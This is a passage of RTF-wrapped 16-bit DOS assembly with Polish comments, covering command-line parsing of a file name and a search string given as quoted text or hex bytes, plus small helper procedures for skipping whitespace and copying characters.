\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc si                              ; pomin licznik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 inc si                              ; pomin spacje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cld                                 ; INC(SI,DI) w oper. na lancuchach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call OpuscSpacje                    ; czytaj az znak <> SPACJA lub TAB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:NumerBledu,BlBrakNazwyPliku  ; ewentualny numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakKoncaLinii               ;\\ czy koniec parametrow ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je BladParametrow                   ;- jesli tak, to powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov di, offset NazwaPliku           ; es:di : tu zapisz wyniki}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call KopiujDoSpacji                 ; kopiuj nazwe pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:NumerBledu,BlBrakCiagu       ; ewentualny numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakKoncaLinii               ;\\ czy koniec parametrow ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je BladParametrow                   ;- jesli tak, to powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 xor al,al                           ; plik ASCIIZ, wiec dodaj zero}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stosb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call OpuscSpacje                    ; czytaj az znak <>SPACJA lub TAB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakKoncaLinii               ; czy koniec parametrow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je BladParametrow                   ; jesli tak, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:NumerBledu,BlZlyCiag         ; ewentualny numer bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov di, offset Ciag                 ; es:di : tu zapisz ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 Call KopiujCiagDoKonca              ; kopiuj parametr : ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jc BladParametrow                   ; jesli TAK, to blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov ax,di}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub ax,offset Ciag}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jz  BladParametrow                  ; jesli TAK, to lancuch pusty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:DlugoscCiagu ,ax             ; - zachowaj dlugosc ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov es:AbsDlugoscCiagu ,ax          ; - zachowaj 2-i raz dlugosc ciagu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 clc                                 ; nie ma bledu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short $+3                       ; skocz i pomin rozkaz STC}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch BladParametrow:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stc                                 ; jest blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 pop ds}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; wroc z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytajParametry endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OpuscSpacje     proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ; czytaj znak z ds:[si], inc si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakSpacji                   ;\\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je OpuscSpacje                      ; \\ czy spacja lub znak tabulacji ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakTabulacji                ; / jezeli tak, to czytaj nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je OpuscSpacje                      ;/}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec si                              ; zmniejsz wskaznik na poprzedni znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powroc z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OpuscSpacje     endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujDoSpacji  proc near}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ; czytaj znak z ds:[si], inc si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakSpacji                   ;\\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je NieKopiuj                        ; \\ czy spacja lub znak tabulacji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakTabulacji                ;  \\lub koniec linii polecen}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je NieKopiuj                        ;  /jezeli tak, to koncz kopiowanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakKoncaLinii               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je NieKopiuj                        ;/}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stosb                               ; skopiuj znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp short KopiujZnak                ; skocz i wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      NieKopiuj:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 dec si                              ; zmniejsz wskaznik na poprzedni znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ret                                 ; powroc z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujDoSpacji  endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujCiagDoKonca proc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pa_Nic          = 00}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pa_Apostrof     = 01}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bl,Pa_Nic                       ; nie bylo znaku specjalnego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bh,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KopiujParamZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 lodsb                               ; czytaj znak z ds:[si], inc si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp bl,Pa_Apostrof                  ; czy tekst w apostrofach ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne ZwyklyTekst                     ; NIE - dane heksalne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,39                           ; czy znak apostrofu ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne NieKoniecTekstu                 ; Nie - idz dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bl,Pa_Nic                       ; koniec tekstu w apostrofach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp KopiujParamZnak                 ; idz po kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieKoniecTekstu:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stosb                               ; kopiuj zwykly tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp KopiujParamZnak                 ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZwyklyTekst:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,39                           ; czy apostrof poczatkowy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jne NiePoczatektekstu               ; NIE - sprawdzaj dalej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bl,Pa_Apostrof                  ; ustaw flage}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jmp KopiujParamZnak                 ; idz po nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NiePoczatektekstu:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakKoncaLinii               ; \\ pomin, gdy znak=CR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  KoniecParamTekstu               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakSpacji                   ; \\ pomin, gdy znak=spacja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  KopiujParamZnak                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,ZnakTabulacji                ; \\ pomin, gdy znak=TAB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  KopiujParamZnak                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,'0'                          ; czy znak >=0 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jb  KoniecParamTekstuBlad           ; < blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,'9'                          ; czy znak 0..9 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jbe ToCyfra09                       ; TAK - cyfra}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 and al,0DFh                         ; 'a'..'z'->'A'..'Z'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,'A'                          ; czy znak <'A' ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jb  KoniecParamTekstuBlad           ; TAK - blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,'F'                          ; czy znak >'F' ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 ja  KoniecParamTekstuBlad           ; TAK - blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                                     ; znak '0'..'F'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ToCyfra09:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp bh,0                            ; czy licznik znakow=0 ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 je  ToPierwszyZnak                  ; TAK - zachowaj znak na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp al,'9'                          ; czy znak to cyfra ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jbe ALJest09                        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub al,'A'-'0'-10                   ; konwertuj na liczbe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ALJest09:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 cmp ah,'9'                          ; czy drugi znak to cyfra ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 jbe AHJest09}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub ah,'A'-'0'-10                   ; konwertuj na liczbe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AHJest09:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 sub ax,'00'                         ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bh,al                           ;  \\  konwersja liczby}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov al,16                           ;   \\ heksalnej zapisanej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mul ah                              ;   / jako lancuch, na zwykla}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 add al,bh                           ;  /  liczbe (znak ASCII)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 stosb                               ; /   i zapisz znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 mov bh,0                            ; licznik znakow znow=0}{\f2\fs24\lang1045{\*\listtag0}\par}
